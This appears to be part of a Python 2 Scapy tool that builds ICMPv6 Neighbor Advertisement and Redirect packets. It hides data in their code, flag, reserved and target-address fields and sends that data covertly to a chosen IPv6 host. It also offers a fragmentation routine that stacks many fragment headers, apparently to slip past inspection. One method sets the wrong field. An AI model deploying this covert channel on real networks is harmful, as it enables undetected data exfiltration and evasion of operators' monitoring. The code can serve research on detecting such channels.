class NeighborAdvertisementCovert:

    def __init__(self, frag):
        self.fragmentation = frag
        self.bandwidthCode = 1
        self.bandwidthR = 1
        self.bandwidthS = 1        
        self.bandwidthO = 1
        #able to manage only multiple of 8 - reserved field is 29
        self.bandwidthRes = 3
        self.bandwidthTargetAddress = 16
        self.nameCode = 'Neighbor Advertisement code '
        self.nameR = 'Neighbor Advertisement R '
        self.nameS = 'Neighbor Advertisement S '
        self.nameO = 'Neighbor Advertisement O '        
        self.nameRes = 'Neighbor Advertisement reserved '
        self.nameTargetAddress = 'Neighbor Advertisement target address '

    def buildPacketCode(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_NA(code=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_NA(code=chunk)]

    def buildPacketR(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_NA(code=1, R=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_NA(code=1, R=chunk)]

    def buildPacketS(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_NA(code=2, S=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_NA(code=2, S=chunk)]

    def buildPacketO(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_NA(code=3, O=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_NA(code=3, O=chunk)]

    def buildPacketRes(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_NA(res=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_NA(res=chunk)]

    def buildPacketTargetAddress(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_NA(tgt=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_NA(tgt=chunk)]
        
    def execModule(self, dataCode, dataR, dataS, dataO, dataRes, dataTargetAddress, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCode(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataR:
            data = self.nameR+dataR
            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthR, self.nameR)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketR(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataS:
            data = self.nameS+dataS
            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthS, self.nameS)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketS(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataO:
            data = self.nameO+dataO
            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthO, self.nameO)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketO(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes, self.nameRes)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketRes(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataTargetAddress:
            data = self.nameTargetAddress+dataTargetAddress
            sendingBuffer = HelperClass.chunkPacketsToAddress(data, self.bandwidthTargetAddress, self.nameTargetAddress)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketTargetAddress(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)

        
class RedirectCovert:

    def __init__(self, frag):
        self.fragmentation = frag
        self.bandwidthCode = 1
        self.bandwidthRes = 4
        self.bandwidthTargetAdr = 16
        self.bandwidthDestAdr = 16
        self.nameCode = 'Redirect code '
        self.nameRes = 'Redirect reserved '
        self.nameTargetAdr = 'Redirect target address '
        self.nameDestAdr = 'Redirect destination address '

    def buildPacketCode(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_Redirect(code=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_Redirect(code=chunk)]

    def buildPacketRes(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_Redirect(res=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_Redirect(res=chunk)]

    def buildPacketTargetAdr(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_Redirect(tgt=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_Redirect(tgt=chunk)]

    def buildPacketDestAdr(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_Redirect(tgt=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_Redirect(tgt=chunk)]
        
    def execModule(self, dataCode, dataRes, dataTargetAdr, dataDestAdr, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCode(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes, self.nameRes)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketRes(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataTargetAdr:
            data = self.nameTargetAdr+dataTargetAdr
            sendingBuffer = HelperClass.chunkPacketsToAddress(data, self.bandwidthTargetAdr, self.nameTargetAdr)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketTargetAdr(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataDestAdr:
            data = self.nameDestAdr+dataDestAdr
            sendingBuffer = HelperClass.chunkPacketsToAddress(data, self.bandwidthDestAdr, self.nameDestAdr)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketDestAdr(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)  

                
class HelperClass:

    @classmethod
    def chunkPackets(self, data, maxPacketSize, messageAndField):
        print '[*] %s' % messageAndField 
        print '[*] bandwidth %d' % maxPacketSize
        sendingBuffer = []
        chunkNumber = 0
        print '[*] size of data %d' % len(data)
        chunks = [data[i:i+maxPacketSize] for i in range(0, len(data), maxPacketSize)]
        for tmpChunk in chunks:
            chunkNumber += 1
            tmpBit = BitArray()
            for c in tmpChunk:
                bit = BitArray(uint=ord(c), length=8)
                tmpBit.append(bit)
            sendingBuffer.append(int(tmpBit.bin, 2))
        print '[*] chunks %d' % chunkNumber
        return sendingBuffer

    @classmethod
    def chunkPacketsBit(self, data, maxPacketSize, messageAndField):
        print '[*] %s' % messageAndField
        maxP = float(format(maxPacketSize, '.2f'))/8
        print '[*] bandwidth %s' % format(maxP, '.2f')
        sendingBuffer = []
        chunkNumber = 0
        print '[*] size of data %d' % len(data)
        chunks = [data[i:i+maxPacketSize] for i in range(0, len(data), maxPacketSize)]
        for tmpChunk in chunks:
            for c in tmpChunk:
                bits = BitArray(uint=ord(c), length=8)
                for bit in bits.bin:
                    chunkNumber += 1
                    sendingBuffer.append(int(bit))
        print '[*] chunks %d' % chunkNumber
        return sendingBuffer

    @classmethod
    def chunkPackets2Bit(self, data, maxPacketSize, messageAndField):
        print '[*] %s' % messageAndField
        maxP = float(format(maxPacketSize, '.2f'))/8*2
        print '[*] bandwidth %s' % format(maxP, '.2f')
        sendingBuffer = []
        chunkNumber = 0
        print '[*] size of data %d' % len(data)
        chunks = [data[i:i+maxPacketSize] for i in range(0, len(data), maxPacketSize)]
        for tmpChunk in chunks:
            for c in tmpChunk:
                bits = BitArray(uint=ord(c), length=8)
                for bit in range(0, len(bits.bin), 2):
                    chunkNumber += 1
                    sendingBuffer.append(int(bits.bin[bit:(bit+2)], 2))
        print '[*] chunks %d' % chunkNumber
        return sendingBuffer
    
    @classmethod
    def chunkPacketsToAddress(self, data, maxPacketSize, messageAndField):
        print '[*] %s' % messageAndField 
        print '[*] bandwidth %d' % maxPacketSize
        sendingBuffer = []
        chunkNumber = 0
        print '[*] size of data %d' % len(data)
        chunks = [data[i:i+maxPacketSize] for i in range(0, len(data), maxPacketSize)]
        for tmpChunk in chunks:
            tmpSendingBuffer = ''
            chunkNumber += 1
            for c in range(0, len(tmpChunk), 2):
                try:
                    tmpBit = BitArray()
                    firstElement = tmpChunk[c]
                    firstInt = ord(firstElement)
                    firstBit = BitArray(uint=firstInt, length=8)
                    if c < (len(tmpChunk)-1):
                        secondElement = tmpChunk[c+1]
                        secondInt = ord(secondElement)
                        secondBit = BitArray(uint=secondInt, length=8)
                        tmpBit.append(firstBit + secondBit)
                    else:
                        tmpBit.append(firstBit)
                    #print "[*] tmpBit in hex is %s" % str(hex(int(tmpBit.bin, 2)))
                    if c < (len(tmpChunk)-2):
                        tmpSendingBuffer += str(tmpBit.hex) + ':'
                    elif (c/2+1) < 7:
                        tmpSendingBuffer += str(tmpBit.hex) + '::1'
                    elif (c/2+1) == 7:
                        tmpSendingBuffer += str(tmpBit.hex) + ':1'
                    else:
                        tmpSendingBuffer += str(tmpBit.hex)
                except TypeError:
                    print "Error chunking %s%s " % firstElement % secondElement
            try:
                #print "[*] tmpSendingBuffer is %s" % tmpSendingBuffer
                sendingBuffer.append(tmpSendingBuffer)
            except:
                print "[*] error appending buffer"
        print '[*] chunks %d' % chunkNumber
        return sendingBuffer

    @classmethod
    def fragmentPacket(self, ipAdr, message):
        packetContainer = []
        ipv6_1 = IPv6(dst=ipAdr)
        ipv6_2 = IPv6(dst=ipAdr)
        icmpv6 = message
        payload = "xxxxxxxx"
        frag = ipv6_1/IPv6ExtHdrFragment(nh=44)/payload
        icmp1 = ipv6_2/IPv6ExtHdrFragment(nh=58)/icmpv6
        icmp2 = ipv6_2/IPv6ExtHdrFragment(nh=58)/payload
        ## for p in range(0, 10):
        ##     packetContainer.append(ipv6_1/IPv6ExtHdrFragment(offset=p,m=1,nh=44))
        ## packetContainer.append(ipv6_2/IPv6ExtHdrFragment(offset=10,m=0,nh=58)/icmpv6)
        packet = fragment6(ipv6_1/IPv6ExtHdrFragment()/IPv6ExtHdrFragment()/IPv6ExtHdrFragment()/IPv6ExtHdrFragment()/IPv6ExtHdrFragment()/IPv6ExtHdrFragment()/IPv6ExtHdrFragment()/IPv6ExtHdrFragment()/IPv6ExtHdrFragment()/IPv6ExtHdrFragment()/IPv6ExtHdrFragment(nh=58)/icmpv6, 80)
        for p in packet:
            packetContainer.append(p)
        return packetContainer

    @classmethod
    def receiver(self, iface, adr):
        rec = Receiver(iface, adr)
        rec.receive()
